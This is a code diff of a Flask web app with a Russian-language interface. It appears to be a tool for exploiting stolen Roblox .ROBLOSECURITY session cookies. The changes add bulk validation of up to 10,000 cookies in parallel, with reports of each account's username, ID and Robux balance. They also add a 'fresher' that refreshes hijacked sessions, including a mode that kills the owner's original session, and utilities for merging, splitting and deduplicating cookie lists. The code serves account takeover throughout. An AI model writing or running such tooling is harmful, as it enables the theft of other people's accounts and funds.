-        let r = await fetch('/api/fullcheck', { method: 'POST', body: fd });
+        let r = await fetch('/api/single-check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ cookie: cookie })
+        });
         let d = await r.json();
         progress.style.width = '100%';
         setTimeout(() => { progress.style.width = '0%'; }, 1000);
+        
         if (d.success) {
-            let html = '✅ Проверено: ' + d.total + ' | Валидных: ' + d.valid_count + '\n\n';
-            for (let rep of d.reports) html += rep + '\n' + '─'.repeat(40) + '\n';
-            if (d.download_url) html += '\n📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
-            resBox.innerHTML = html;
-            resBox.scrollTop = resBox.scrollHeight;
+            resBox.textContent = d.report;
+            resBox.scrollTop = 0;
             loadCheckerHistory();
         } else {
             resBox.textContent = '❌ ' + (d.message || 'Ошибка');
@@ -1012,18 +1115,75 @@ async function runFullcheck() {
     }
 }
 
-function clearInputs() {
-    document.getElementById('manualCookies').value = '';
-    document.getElementById('fileStatusInfo').textContent = '';
-    document.getElementById('fullcheckResult').textContent = 'Результаты появятся здесь...';
+// ===== МАССОВАЯ ПРОВЕРКА =====
+async function runMassCheck() {
+    let resBox = document.getElementById('massResult');
+    let progress = document.getElementById('massProgress');
+    let content = window.massFileContent;
+    
+    if (!content) {
+        // Пробуем взять из textarea если есть
+        let manual = document.getElementById('singleCookie').value.trim();
+        if (manual && manual.includes('\n')) {
+            content = manual;
+        } else {
+            resBox.textContent = '❌ Загрузите TXT файл с куками!';
+            return;
+        }
+    }
+    
+    resBox.textContent = '⏳ Массовая проверка запущена...\nЭто может занять время в зависимости от количества куков.';
+    progress.style.width = '20%';
+    
+    try {
+        let fd = new FormData();
+        fd.append('file', new Blob([content], { type: 'text/plain' }), 'mass_check.txt');
+        
+        let r = await fetch('/api/mass-check', { method: 'POST', body: fd });
+        let d = await r.json();
+        progress.style.width = '100%';
+        setTimeout(() => { progress.style.width = '0%'; }, 1000);
+        
+        if (d.success) {
+            let html = '══════════ РЕЗУЛЬТАТЫ ПРОВЕРКИ ══════════\n\n';
+            html += '📊 Всего проверено: ' + d.total + '\n';
+            html += '✅ Валидных: ' + d.valid_count + '\n';
+            html += '❌ Невалидных: ' + d.invalid_count + '\n\n';
+            html += '────────────────────────────────────────\n\n';
+            
+            for (let line of d.results) {
+                html += line + '\n';
+            }
+            
+            if (d.download_url) {
+                html += '\n────────────────────────────────────────\n';
+                html += '📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать результаты (.txt)</a>\n';
+            }
+            
+            resBox.innerHTML = html;
+            resBox.scrollTop = 0;
+            loadCheckerHistory();
+        } else {
+            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
+        }
+    } catch(e) {
+        resBox.textContent = '❌ Ошибка: ' + e.message;
+        progress.style.width = '0%';
+    }
 }
 
+// ===== ФРЕШЕР =====
 async function runFresher() {
     let resBox = document.getElementById('fresherResult');
     let cookies = document.getElementById('fresherCookies').value.trim();
     let mode = document.getElementById('fresherMode').value;
+    let progress = document.getElementById('fresherProgress');
+    
     if (!cookies) { resBox.textContent = '❌ Вставьте куки!'; return; }
-    resBox.textContent = '⏳ Обновление сессий и валидация...';
+    
+    resBox.textContent = '⏳ Обновление сессий...';
+    progress.style.width = '30%';
+    
     try {
         let r = await fetch('/api/fresher', {
             method: 'POST',
@@ -1031,19 +1191,36 @@ async function runFresher() {
             body: JSON.stringify({ cookies: cookies, mode: mode })
         });
         let d = await r.json();
-        if (d.success && d.cookies_only && d.cookies_only.length > 0) {
-            resBox.textContent = d.cookies_only.join('\n');
+        progress.style.width = '100%';
+        setTimeout(() => { progress.style.width = '0%'; }, 1000);
+        
+        if (d.success) {
+            let html = '✅ Обновлено: ' + d.refreshed_count + ' куки\n\n';
+            html += '══════════ НОВЫЕ КУКИ ══════════\n\n';
+            for (let item of d.refreshed_list) {
+                html += item + '\n';
+            }
+            if (d.only_cookies) {
+                html += '\n══════════ ТОЛЬКО КУКИ ══════════\n\n';
+                html += d.only_cookies;
+            }
+            resBox.textContent = html;
             loadFresherHistory();
         } else {
-            resBox.textContent = '❌ ' + (d.message || 'Не удалось обновить куки (не прошли валидацию или невалидны)');
+            resBox.textContent = '❌ ' + (d.message || 'Ошибка');
         }
     } catch(e) {
         resBox.textContent = '❌ Ошибка: ' + e.message;
+        progress.style.width = '0%';
     }
 }
 
-// ===== ИСТОРИЯ =====
+function clearFresherInputs() {
+    document.getElementById('fresherCookies').value = '';
+    document.getElementById('fresherResult').textContent = 'Результаты фрешера...';
+}
 
+// ===== ИСТОРИЯ =====
 async function loadCheckerHistory() {
     let container = document.getElementById('checkerHistoryList');
     try {
@@ -1052,8 +1229,9 @@ async function loadCheckerHistory() {
         if (d.history && d.history.length > 0) {
             let html = '';
             d.history.slice().reverse().forEach(item => {
-                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\ me===\'none\'?\'block\':\'none\'">';
-                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">✅ ' + item.valid + '/' + item.total + '</span></div>';
+                let typeLabel = item.type === 'mass' ? '📦 Массовая' : '🔍 Одиночная';
+                html += '<div class="history-item" onclick="let det=this.querySelector(\'.hist-detail\');det.style.display=det.style.display===\'none\'?\'block\':\'none\'">';
+                html += '<div class="hist-header"><span class="hist-date">📅 ' + item.timestamp + '</span><span class="hist-stats">' + typeLabel + ' | ✅ ' + item.valid + '/' + item.total + '</span></div>';
                 html += '<div class="hist-detail">' + (item.cookies ? item.cookies.join('\n───\n') : 'Нет данных') + '</div></div>';
             });
             container.innerHTML = html;
@@ -1061,12 +1239,12 @@ async function loadCheckerHistory() {
             container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
         }
     } catch(e) {
-        container.innerHTML = '<div class="empty-history">❌ Ошибка загрузки</div>';
+        container.innerHTML = '<div class="empty-history">❌ Ошибка</div>';
     }
 }
 
 async function clearCheckerHistory() {
-    if (!confirm('Удалить историю проверок?')) return;
+    if (!confirm('Удалить историю?')) return;
     await fetch('/api/history/checker/clear', { method: 'POST' });
     loadCheckerHistory();
 }
@@ -1089,22 +1267,21 @@ async function loadFresherHistory() {
             container.innerHTML = '<div class="empty-history">📭 История пуста</div>';
         }
     } catch(e) {
-        container.innerHTML = '<div class="empty-history">❌ Ошибка загрузки</div>';
+        container.innerHTML = '<div class="empty-history">❌ Ошибка</div>';
     }
 }
 
 async function clearFresherHistory() {
-    if (!confirm('Удалить историю фрешера?')) return;
+    if (!confirm('Удалить историю?')) return;
     await fetch('/api/history/fresher/clear', { method: 'POST' });
     loadFresherHistory();
 }
 
 // ===== ИНСТРУМЕНТЫ =====
-
 async function mergeCookies() {
     let files = document.getElementById('mergeFiles').files;
     if (!files || files.length < 2) {
-        document.getElementById('mergeResult').textContent = '❌ Выберите минимум 2 файла';
+        document.getElementById('mergeResult').textContent = '❌ Минимум 2 файла';
         return;
     }
     let fd = new FormData();
@@ -1137,7 +1314,7 @@ async function splitByCount() {
         });
         let d = await r.json();
         if (d.success) {
-            document.getElementById('splitCountResult').innerHTML = '✅ Файлов: ' + d.file_count + '<br>📊 Куки: ' + d.total_cookies + '<br>📦 По ' + count + ' шт.<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
+            document.getElementById('splitCountResult').innerHTML = '✅ Файлов: ' + d.file_count + '<br>📊 Куки: ' + d.total_cookies + '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
         } else {
             document.getElementById('splitCountResult').textContent = '❌ ' + (d.message || 'Ошибка');
         }
@@ -1160,7 +1337,7 @@ async function splitByFiles() {
         });
         let d = await r.json();
         if (d.success) {
-            document.getElementById('splitFilesResult').innerHTML = '✅ Файлов: ' + num + '<br>📊 Куки: ' + d.total_cookies + '<br>📦 ~' + Math.ceil(d.total_cookies/num) + ' шт.<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
+            document.getElementById('splitFilesResult').innerHTML = '✅ Файлов: ' + num + '<br>📊 Куки: ' + d.total_cookies + '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать ZIP</a>';
         } else {
             document.getElementById('splitFilesResult').textContent = '❌ ' + (d.message || 'Ошибка');
         }
@@ -1169,7 +1346,7 @@ async function splitByFiles() {
     }
 }
 
-async function cleanCookiesAction(action) {
+async function cleanCookies(action) {
     let content = document.getElementById('cleanCookiesInput').value.trim();
     if (!content) { document.getElementById('cleanResult').textContent = '❌ Вставьте куки'; return; }
     document.getElementById('cleanResult').textContent = '⏳ Обработка...';
@@ -1182,7 +1359,7 @@ async function cleanCookiesAction(action) {
         let d = await r.json();
         if (d.success) {
             let txt = '✅ Было: ' + d.original_count + ' | Стало: ' + d.processed_count;
-            if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено дубликатов: ' + d.duplicates_removed;
+            if (d.duplicates_removed > 0) txt += '<br>🗑️ Удалено: ' + d.duplicates_removed;
             txt += '<br><br>📥 <a href="' + d.download_url + '" class="btn btn-primary" target="_blank">Скачать</a>';
             document.getElementById('cleanResult').innerHTML = txt;
         } else {
@@ -1206,75 +1383,103 @@ loadCheckerHistory();
 def index():
     return render_template_string(HTML)
 
-@app.route("/api/upload", methods=["POST"])
-def api_upload():
-    global CURRENT_UPLOADED_FILE
-    if 'file' not in request.files:
-        return jsonify({"success": False, "message": "Файл не найден"})
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"success": False, "message": "Имя пустое"})
-    filename = f"uploaded_{int(time.time())}_{file.filename}"
-    filepath = os.path.join("uploads", filename)
-    file.save(filepath)
-    CURRENT_UPLOADED_FILE = filepath
-    return jsonify({"success": True, "filename": file.filename})
+@app.route("/api/single-check", methods=["POST"])
+def api_single_check():
+    """Одиночная полная проверка"""
+    data = request.json or {}
+    cookie = data.get("cookie", "").strip()
+    
+    if not cookie:
+        return jsonify({"success": False, "message": "Кук не предоставлен"})
+    
+    info = get_full_info(cookie)
+    report = format_full_report(info)
+    
+    add_to_checker_history({
+        'type': 'single',
+        'total': 1,
+        'valid': 1 if info['status'] == '✅' else 0,
+        'cookies': [report],
+        'download_url': ''
+    })
+    
+    return jsonify({
+        "success": True,
+        "report": report,
+        "status": info['status']
+    })
 
-@app.route("/api/fullcheck", methods=["POST"])
-def api_fullcheck():
-    global CURRENT_UPLOADED_FILE
+@app.route("/api/mass-check", methods=["POST"])
+def api_mass_check():
+    """Массовая быстрая проверка через TXT файл"""
     content = ""
-    if CURRENT_UPLOADED_FILE and os.path.exists(CURRENT_UPLOADED_FILE):
-        with open(CURRENT_UPLOADED_FILE, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-    elif 'file' in request.files:
+    if 'file' in request.files:
         content = request.files['file'].read().decode('utf-8', errors='ignore')
     
+    if not content:
+        return jsonify({"success": False, "message": "Файл не предоставлен или пуст"})
+    
     cookies = [line.strip() for line in content.split('\n') if len(line.strip()) > 20]
+    
     if not cookies:
-        return jsonify({"success": False, "message": "Куки не найдены"})
+        return jsonify({"success": False, "message": "Куки не найдены в файле"})
     
-    reports = []
-    file_payloads = []
-    cookie_hist = []
+    if len(cookies) > 10000:
+        cookies = cookies[:10000]
     
-    for c in cookies:
-        info = get_full_info(c)
-        if info['status'] == '✅':
-            rep = format_short_report(info)
-            reports.append(rep)
-            cookie_hist.append(rep)
-            txt = generate_full_txt_report(info)
-            safe_name = re.sub(r'[\/*?:"<>|]', "", str(info['Username']))
-            file_payloads.append((f"{safe_name}_{info['UserID']}.txt", txt))
+    # Запускаем массовую проверку
+    results = mass_check_cookies(cookies, max_workers=10)
+    
+    valid_results = []
+    invalid_results = []
+    formatted_results = []
+    
+    for r in results:
+        line = format_quick_report(r)
+        formatted_results.append(line)
+        if r['status'] == '✅':
+            valid_results.append(r)
         else:
-            cookie_hist.append(f"❌ {c[:50]}...")
+            invalid_results.append(r)
     
-    zip_buffer = BytesIO()
-    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
-        for fname, ftxt in file_payloads:
-            zf.writestr(fname, ftxt)
-    zip_buffer.seek(0)
-    
+    # Сохраняем результаты в файл
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-    archive_name = f"reports_{timestamp}.zip"
-    filepath = os.path.join("downloads", archive_name)
-    with open(filepath, 'wb') as f:
-        f.write(zip_buffer.getvalue())
+    filename = f"mass_check_{timestamp}.txt"
+    filepath = os.path.join("downloads", filename)
     
-    download_url = f"/downloads/{archive_name}"
+    with open(filepath, 'w', encoding='utf-8') as f:
+        f.write(f"Результаты массовой проверки ({timestamp})\n")
+        f.write("=" * 50 + "\n")
+        f.write(f"Всего: {len(results)}\n")
+        f.write(f"Валидных: {len(valid_results)}\n")
+        f.write(f"Невалидных: {len(invalid_results)}\n")
+        f.write("=" * 50 + "\n\n")
+        f.write("✅ ВАЛИДНЫЕ КУКИ:\n")
+        f.write("-" * 30 + "\n")
+        for r in valid_results:
+            f.write(f"{r['username']} [{r['user_id']}] | Robux: {r['robux']} | {r['created']}\n")
+            f.write(f"{r['cookie']}\n\n")
+        f.write("\n❌ НЕВАЛИДНЫЕ КУКИ:\n")
+        f.write("-" * 30 + "\n")
+        for r in invalid_results:
+            f.write(f"{r['cookie']}\n")
+    
+    download_url = f"/downloads/{filename}"
+    
     add_to_checker_history({
-        'total': len(cookies),
-        'valid': len(reports),
-        'cookies': cookie_hist,
+        'type': 'mass',
+        'total': len(results),
+        'valid': len(valid_results),
+        'cookies': formatted_results[:20],
         'download_url': download_url
     })
     
     return jsonify({
         "success": True,
-        "total": len(cookies),
-        "valid_count": len(reports),
-        "reports": reports,
+        "total": len(results),
+        "valid_count": len(valid_results),
+        "invalid_count": len(invalid_results),
+        "results": formatted_results,
         "download_url": download_url
     })
 
@@ -1283,31 +1488,53 @@ def api_fresher():
     data = request.json or {}
     raw = data.get("cookies", "")
     mode = data.get("mode", "duplicate")
+    cookies_list = [line.strip() for line in raw.split('\n') if len(line) > 20]
     
-    cookies = [line.strip() for line in raw.split('\n') if len(line.strip()) > 20]
-    if not cookies:
+    if not cookies_list:
         return jsonify({"success": False, "message": "Куки не найдены"})
     
-    cookies_only = []
+    refreshed = []
+    only_cookies = []
+    cookie_hist = []
     
-    for c in cookies:
-        refreshed_cookie = refresh_roblox_cookie(c, mode=mode)
-        if refreshed_cookie:
-            cookies_only.append(refreshed_cookie)
+    for c in cookies_list:
+        cleaned = c.strip()
+        if ".ROBLOSECURITY=" in cleaned:
+            cleaned = cleaned.split(".ROBLOSECURITY=")[1].split(";")[0]
+        
+        result = refresh_roblox_cookie(c, kill_old=(mode == 'kill'))
+        
+        if result['success'] and result['new_cookie']:
+            new_cookie = result['new_cookie']
+            username = result.get('username', '?')
+            user_id = result.get('user_id', '?')
+            ml = "💀 Сброс" if mode == 'kill' else "♻️ Дублирование"
+            
+            hist_entry = f"🟢 {username} [{user_id}] - {ml}\nНовая: {new_cookie}"
+            cookie_hist.append(hist_entry)
+            refreshed.append(f"🟢 {username} [{user_id}]\n{new_cookie}")
+            only_cookies.append(new_cookie)
+        else:
+            info = get_full_info(c)
+            if info['status'] == '✅':
+                hist_entry = f"⚠️ {info['Username']} [{info['UserID']}] - без изменений\n{c}"
+                cookie_hist.append(hist_entry)
+                refreshed.append(f"⚠️ {info['Username']} [{info['UserID']}] (без изменений)\n{c}")
+                only_cookies.append(c)
+            else:
+                cookie_hist.append(f"❌ Невалид: {c[:50]}...")
     
-    if not cookies_only:
-        return jsonify({"success": False, "message": "Не удалось обновить куки. Они либо сброшены, либо не прошли проверку валидатора."})
-
     add_to_fresher_history({
         'mode': mode,
-        'refreshed_count': len(cookies_only),
-        'cookies': cookies_only
+        'refreshed_count': len(refreshed),
+        'cookies': cookie_hist
     })
     
     return jsonify({
         "success": True,
-        "refreshed_count": len(cookies_only),
-        "cookies_only": cookies_only
+        "refreshed_count": len(refreshed),
+        "refreshed_list": refreshed,
+        "only_cookies": '\n'.join(only_cookies) if only_cookies else ''
     })
 
 @app.route("/api/history/checker")
@@ -1336,11 +1563,9 @@ def api_merge_cookies():
     if len(files) < 2:
         return jsonify({"success": False, "message": "Минимум 2 файла"})
     
-    contents = []
-    for file in files:
-        contents.append(file.read().decode('utf-8', errors='ignore'))
-    
+    contents = [file.read().decode('utf-8', errors='ignore') for file in files]
     merged = merge_cookie_files(contents)
+    
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     filename = f"merged_{timestamp}.txt"
     filepath = os.path.join("downloads", filename)
@@ -1364,13 +1589,11 @@ def api_split_cookies():
     content = data.get("content", "")
     split_type = data.get("split_type", "count")
     count = data.get("count", 100)
+    
     if not content:
         return jsonify({"success": False, "message": "Нет данных"})
     
-    if split_type == "count":
-        files = split_cookies_by_count(content, count)
-    else:
-        files = split_cookies_by_files(content, count)
+    files = split_cookies_by_count(content, count) if split_type == "count" else split_cookies_by_files(content, count)
     
     if not files:
         return jsonify({"success": False, "message": "Не удалось разделить"})
@@ -1401,15 +1624,12 @@ def api_clean_cookies():
     data = request.json or {}
     content = data.get("content", "")
     action = data.get("action", "deduplicate")
+    
     if not content:
         return jsonify({"success": False, "message": "Нет данных"})
     
     orig_lines = [l for l in content.split('\n') if l.strip()]
-    if action == "deduplicate":
-        processed = remove_duplicates(content)
-    else:
-        processed = clean_cookies(content)
-    
+    processed = remove_duplicates(content) if action == "deduplicate" else clean_cookies(content)
     proc_lines = [l for l in processed.split('\n') if l.strip()]
     
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
